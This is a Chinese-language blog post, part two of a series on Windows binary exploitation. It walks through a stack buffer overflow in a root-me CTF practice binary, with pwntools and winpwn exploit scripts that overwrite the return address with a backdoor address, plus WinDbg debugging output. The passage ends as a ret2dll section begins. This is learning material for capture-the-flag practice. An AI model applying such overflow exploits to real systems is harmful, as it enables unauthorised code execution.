@@ -1,0 +1,425 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="首发于：先知社区 上一节笔者学习了winpwn的用法，以及最基础的栈溢出利用用法和win pwn的保护机制的意思，这一节笔者学习了利用pwntools编写exp以及调试程序，也学习了ret2dll的利用手法  之前的文章链接：  win pwn初探（一）  win pwn初探（二）利用pwntools编写exp这里需要Ex师傅的一个工具：Win Server，这个就像搭建pwn题一样，把exe给">
+<meta property="og:type" content="article">
+<meta property="og:title" content="win pwn初探（二）">
+<meta property="og:url" content="http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
+<meta property="og:site_name" content="z1r0's blog">
+<meta property="og:description" content="首发于：先知社区 上一节笔者学习了winpwn的用法，以及最基础的栈溢出利用用法和win pwn的保护机制的意思，这一节笔者学习了利用pwntools编写exp以及调试程序，也学习了ret2dll的利用手法  之前的文章链接：  win pwn初探（一）  win pwn初探（二）利用pwntools编写exp这里需要Ex师傅的一个工具：Win Server，这个就像搭建pwn题一样，把exe给">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/1.png">
+<meta property="og:image" content="http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/2.png">
+<meta property="og:image" content="http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/3.png">
+<meta property="og:image" content="http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/4.png">
+<meta property="og:image" content="http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/5.png">
+<meta property="og:image" content="http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/6.png">
+<meta property="og:image" content="http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/7.png">
+<meta property="article:published_time" content="2022-11-30T00:36:06.000Z">
+<meta property="article:modified_time" content="2022-12-02T11:45:04.427Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="win pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>win pwn初探（二）</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;text=win pwn初探（二）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;title=win pwn初探（二）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;is_video=false&amp;description=win pwn初探（二）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=win pwn初探（二）&amp;body=Check out this article: http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;title=win pwn初探（二）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;title=win pwn初探（二）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;title=win pwn初探（二）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;title=win pwn初探（二）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;name=win pwn初探（二）&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;t=win pwn初探（二）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">win pwn初探（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8pwntools%E7%BC%96%E5%86%99exp"><span class="toc-number">1.1.</span> <span class="toc-text">利用pwntools编写exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E5%90%88pwntools%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">结合pwntools进行调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8winpwn%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">利用winpwn模块进行调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dll"><span class="toc-number">1.4.</span> <span class="toc-text">ret2dll</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.6.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        win pwn初探（二）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-30T00:36:06.000Z" itemprop="datePublished">2022-11-30</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/study/">study</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/win-pwn/" rel="tag">win pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>首发于：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11891">先知社区</a></p>
+<p>上一节笔者学习了winpwn的用法，以及最基础的栈溢出利用用法和win pwn的保护机制的意思，这一节笔者学习了利用pwntools编写exp以及调试程序，也学习了ret2dll的利用手法</p>
+</blockquote>
+<p>之前的文章链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11865">win pwn初探（一）</a></li>
+</ul>
+<h1 id="win-pwn初探（二）"><a href="#win-pwn初探（二）" class="headerlink" title="win pwn初探（二）"></a>win pwn初探（二）</h1><h2 id="利用pwntools编写exp"><a href="#利用pwntools编写exp" class="headerlink" title="利用pwntools编写exp"></a>利用pwntools编写exp</h2><p>这里需要Ex师傅的一个工具：<a target="_blank" rel="noopener" href="https://github.com/Ex-Origin/win_server">Win Server</a>，这个就像搭建pwn题一样，把exe给映射到一个端口上</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/Ex-Origin/win_server.git</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>如上git clone之后即可使用，用法：<code>.\win_server.exe ..\ch72\ch72.exe 1234</code>就可以把ch72.exe给映射到1234端口上，试着用nc连接一下，发现可以正常的执行程序</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16</span>:<span class="number">15</span>:<span class="number">45</span> z1r0@z1r0deMacBook-Pro.local test nc <span class="number">10.211</span><span class="number">.55</span><span class="number">.3</span> <span class="number">1234</span></span><br><span class="line">a</span><br><span class="line">A</span><br></pre></td></tr></tbody></table></figure>
+
+<p>pwntools如下安装</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接着就可以正常使用pwntools了，需要注意的是目前只支持<code>remote</code>的用法</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">p1 += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(p1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>将上一节的exp改一下之后运行可以正常触发calc</p>
+<h2 id="结合pwntools进行调试"><a href="#结合pwntools进行调试" class="headerlink" title="结合pwntools进行调试"></a>结合pwntools进行调试</h2><p>在调试exp的时候花了很长时间，断点下在了main函数入口那里，以为会直接断在那里的。然后运行的时候发现断不了，就在网上找解决方法（srv，reload），心态快要爆炸后，问了一下Ex师傅，师傅看了一眼就知道问题出在了断点下的太前，已经执行过了，在gets后下了一个断点就成功的断下来了</p>
+<p>首先在exp前面加上一个pause()使得程序停住，如下exp运行</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">p1 += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后利用windbg attach到程序上</p>
+<img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/1.png" alt="1" style="zoom: 33%;">
+
+<p>在<code>0x0401088</code>这里下一个断点，并且输入g，g就是程序运行到断点停住</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; bp <span class="number">0x0401088</span></span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; g</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后回到exp那里输入任意键，执行payload，此时windbg会断到断点这里</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">eax=<span class="number">00000012</span> ebx=<span class="number">00243000</span> ecx=<span class="number">00402732</span> edx=<span class="number">0041b</span>098 esi=<span class="number">0041b</span>e28 edi=<span class="number">0041b</span>e2c</span><br><span class="line">eip=<span class="number">00401088</span> esp=<span class="number">0019f</span>e74 ebp=<span class="number">0019f</span>e90 iopl=<span class="number">0</span>         nv up ei pl nz na po nc</span><br><span class="line">cs=<span class="number">001b</span>  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003b</span>  gs=<span class="number">0023</span>             efl=<span class="number">00000202</span></span><br><span class="line">ch72+<span class="number">0x1088</span>:</span><br><span class="line"><span class="number">00401088</span> <span class="number">83</span>c408          add     esp,<span class="number">8</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>在ebp这里减去0x20就可以看到输入了a（0x61）被转换成大写A（0x41），并且后面可以看到ebp被覆盖成了aaaa而返回地址被覆盖成了<code>0x00401000</code>这个地址也就是后门地址</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc ebp - <span class="number">0x20</span></span><br><span class="line"><span class="number">0019f</span>e70  <span class="number">00401088</span> <span class="number">0041b</span>01c <span class="number">0019f</span>e7c <span class="number">41414141</span>  ..@...A.|...AAAA</span><br><span class="line"><span class="number">0019f</span>e80  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">00000010</span>  AAAAAAAAAAAA....</span><br><span class="line"><span class="number">0019f</span>e90  <span class="number">61616161</span> <span class="number">00401000</span> <span class="number">00000000</span> <span class="number">06e29668</span>  aaaa..@.....h...</span><br><span class="line"><span class="number">0019f</span>ea0  <span class="number">06e29690</span> <span class="number">8</span>abb39fd <span class="number">00401347</span> <span class="number">00243000</span>  ....<span class="number">.9</span>..G.@.<span class="number">.0</span>$.</span><br><span class="line"><span class="number">0019f</span>eb0  <span class="number">00243000</span> <span class="number">00000000</span> <span class="number">00401347</span> <span class="number">00243000</span>  <span class="number">.0</span>$.....G.@.<span class="number">.0</span>$.</span><br><span class="line"><span class="number">0019f</span>ec0  <span class="number">0019f</span>ea4 <span class="number">00000000</span> <span class="number">0019f</span>ef8 <span class="number">00401</span>c60  ............`.@.</span><br><span class="line"><span class="number">0019f</span>ed0  <span class="number">8</span>ae3509d <span class="number">00000000</span> <span class="number">0019f</span>ef0 <span class="number">762</span>ec038  .P.........<span class="number">.8</span>..v</span><br><span class="line"><span class="number">0019f</span>ee0  <span class="number">00243000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  <span class="number">.0</span>$.............</span><br></pre></td></tr></tbody></table></figure>
+
+<p>再次g就可以getshell，也可以单步调试-<code>p</code>，下面是ret之后的，可以看到成功跑进后门里</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00363000</span> ecx=<span class="number">00402732</span> edx=<span class="number">0041b</span>098 esi=<span class="number">0041b</span>e28 edi=<span class="number">0041b</span>e2c</span><br><span class="line">eip=<span class="number">00401000</span> esp=<span class="number">0019f</span>e98 ebp=<span class="number">61616161</span> iopl=<span class="number">0</span>         nv up ei pl zr na pe nc</span><br><span class="line">cs=<span class="number">001b</span>  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003b</span>  gs=<span class="number">0023</span>             efl=<span class="number">00000246</span></span><br><span class="line">ch72+<span class="number">0x1000</span>:</span><br><span class="line"><span class="number">00401000</span> <span class="number">55</span>              push    ebp</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="利用winpwn模块进行调试"><a href="#利用winpwn模块进行调试" class="headerlink" title="利用winpwn模块进行调试"></a>利用winpwn模块进行调试</h2><p>winpwn调试和上面的区别是winpwn可以本地调试（对目前来说），在winpwn的官方文档里要求配置一个.winpwn到<strong>HOMEDIR</strong>这个文件夹里面，不知道homedir是什么就可以用如下python运行一下</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.10</span><span class="number">.8</span> (tags/v3<span class="number">.10</span><span class="number">.8</span>:aaaf517, Oct <span class="number">11</span> <span class="number">2022</span>, <span class="number">16</span>:<span class="number">50</span>:<span class="number">30</span>) [MSC v<span class="number">.1933</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.path.expanduser(<span class="string">"~\\.winpwn"</span>)</span><br><span class="line"><span class="string">'C:\\Users\\MAC\\.winpwn'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后写入如下配置</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="string">"debugger"</span>:{</span><br><span class="line">        <span class="string">"i386"</span>: {</span><br><span class="line">            <span class="string">"x64dbg"</span>: <span class="string">"F:\\ctfTools\\debugTools\\x64debug\\release\\x32\\x32dbg.exe"</span>, </span><br><span class="line">            <span class="string">"gdb"</span>: <span class="string">"F:\\ctfTools\\windows-gdb\\mingw-w64-686\\mingw32\\bin\\gdb.exe"</span>, </span><br><span class="line">            <span class="string">"windbg"</span>: <span class="string">"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe"</span>,</span><br><span class="line">            <span class="string">"windbgx"</span>: <span class="string">"C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe"</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"amd64"</span>: {</span><br><span class="line">            <span class="string">"x64dbg"</span>: <span class="string">"F:\\ctfTools\\debugTools\\x64debug\\release\\x64\\x64dbg.exe"</span>, </span><br><span class="line">            <span class="string">"gdb"</span>: <span class="string">"F:\\ctfTools\\windows-gdb\\mingw-w64-64\\mingw64\\bin\\gdb64.exe"</span>, </span><br><span class="line">            <span class="string">"windbg"</span>: <span class="string">"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe"</span>,</span><br><span class="line">            <span class="string">"windbgx"</span>: <span class="string">"C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe"</span></span><br><span class="line">        }</span><br><span class="line">    },</span><br><span class="line">    <span class="string">"debugger_init"</span>: {</span><br><span class="line">        <span class="string">"i386"</span>: {</span><br><span class="line">            <span class="string">"x64dbg"</span>: <span class="string">""</span>, </span><br><span class="line">            <span class="string">"gdb"</span>: <span class="string">""</span>, </span><br><span class="line">            <span class="string">"windbg"</span>: <span class="string">".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"</span>,</span><br><span class="line">            <span class="string">"windbgx"</span>: <span class="string">".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"amd64"</span>: {</span><br><span class="line">            <span class="string">"x64dbg"</span>: <span class="string">""</span>, </span><br><span class="line">            <span class="string">"gdb"</span>: <span class="string">""</span>, </span><br><span class="line">            <span class="string">"windbg"</span>: <span class="string">".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"</span>,</span><br><span class="line">            <span class="string">"windbgx"</span>: <span class="string">".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>目前只需要改第7行的代码，把之前下载的windbg.exe的位置填进去就好了</p>
+<p>然后exp如下</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./ch72.exe'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = process(file_name)</span><br><span class="line"></span><br><span class="line">windbgx.attach(r)</span><br><span class="line">payload  = <span class="string">'a'</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>运行exp时windbg就会自动启动，再像上面pwntools那样下断点即可</p>
+<h2 id="ret2dll"><a href="#ret2dll" class="headerlink" title="ret2dll"></a>ret2dll</h2><p>这个攻击手法和ret2libc相似，用<code>root-me PE32 - Stack buffer overflow avancé</code>这题来学习一下</p>
